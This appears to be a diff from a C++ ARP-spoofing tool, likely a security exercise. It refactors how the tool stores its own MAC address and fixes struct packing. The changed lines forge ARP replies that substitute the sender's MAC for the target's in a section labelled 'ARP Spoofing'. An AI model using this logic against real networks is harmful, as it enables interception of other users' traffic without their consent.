@@ -17,8 +17,9 @@ using namespace std;
 
 char* dev = NULL;
 uint8_t gateway[6];
+uint8_t my_mac[6];
 
-#pragma pack(1)
+#pragma pack(push,1)
 struct eth_header {
 	uint8_t dest_mac[6];
 	uint8_t src_mac[6];
@@ -36,7 +37,7 @@ struct arp_header {
 	uint8_t target_mac[6];
 	uint32_t target_ip;
 };
-#pragma pack(8)
+#pragma pack(pop)
 
 void init(struct eth_header* eth_hdr, struct arp_header* arp_hdr) {
 	eth_hdr->type = htons(0x0806);
@@ -141,7 +142,7 @@ int getMyNetworkInfo(uint8_t* res, uint32_t* ip) {
 }
 
 
-void* _func(u_char* packet, uint8_t* my_mac, int packet_size) {
+void* _func(u_char* packet, int packet_size) {
 	u_char* copied = packet;
 	packet = NULL;
 
@@ -210,7 +211,6 @@ int main(int argc, char* argv[]) {
 	if (eth_hdr == NULL || arp_hdr == NULL) return -3;
 	vector<thread> threads;
 
-	uint8_t smac[6], dmac[6];
 	uint32_t my_ip;
 	uint32_t sender_ip;
 	dev = argv[1];
@@ -220,9 +220,9 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
 		return -1;
 	}
-	if (getMyNetworkInfo(smac, &my_ip) == -1) return -1;
+	if (getMyNetworkInfo(my_mac, &my_ip) == -1) return -1;
 	for (int i=0; i<6; i++) 
-		eth_hdr->src_mac[i] = arp_hdr->sender_mac[i] = smac[i];
+		eth_hdr->src_mac[i] = arp_hdr->sender_mac[i] = my_mac[i];
 	printf("MY IP: %x\n", my_ip);
 	
 	int eth_sz = sizeof(*eth_hdr);
@@ -271,9 +271,9 @@ int main(int argc, char* argv[]) {
 					
 					printf("ARP Spoofing=========================================\n");
 					memcpy(eth_hdr->dest_mac, eth_hdr->src_mac, 6);
-					memcpy(eth_hdr->src_mac, smac, 6);
+					memcpy(eth_hdr->src_mac, my_mac, 6);
 					memcpy(arp_hdr->target_mac, eth_hdr->dest_mac, 6);
-					memcpy(arp_hdr->sender_mac, smac, 6);
+					memcpy(arp_hdr->sender_mac, my_mac, 6);
 
 					arp_hdr->target_ip = arp_hdr->sender_ip;
 					arp_hdr->sender_ip = sender_ip;
@@ -282,7 +282,7 @@ int main(int argc, char* argv[]) {
 					memcpy(packet+14, arp_hdr, arp_sz);
 					printf("=====================================================\n");
 
-					threads.push_back(thread(_func, packet, smac, _sz));
+					threads.push_back(thread(_func, packet, _sz));
 					break;
 				}
 			}
